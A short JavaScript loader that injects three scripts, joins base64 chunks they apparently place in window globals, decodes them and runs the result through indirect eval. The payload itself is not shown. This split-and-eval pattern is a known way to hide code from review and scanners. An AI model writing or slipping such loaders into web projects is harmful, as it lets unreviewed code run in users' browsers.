(function(){
  function go(){
    try{
      var b=(window.__B0__||'')+(window.__B1__||'')+(window.__B2__||'');
      var s=atob(b);
      var u=decodeURIComponent(s.split('').map(function(c){return '%'+('00'+c.charCodeAt(0).toString(16)).slice(-2)}).join(''));
      (0,eval)(u);
    }catch(e){console.error(e)}
  }
  var n=0;
  [0,1,2].forEach(function(i){
    var s=document.createElement('script');
    s.src='b'+i+'.js';
    s.onload=function(){n++;if(n===3)go();};
    s.onerror=function(){n++;if(n===3)go();};
    document.head.appendChild(s);
  });
})();
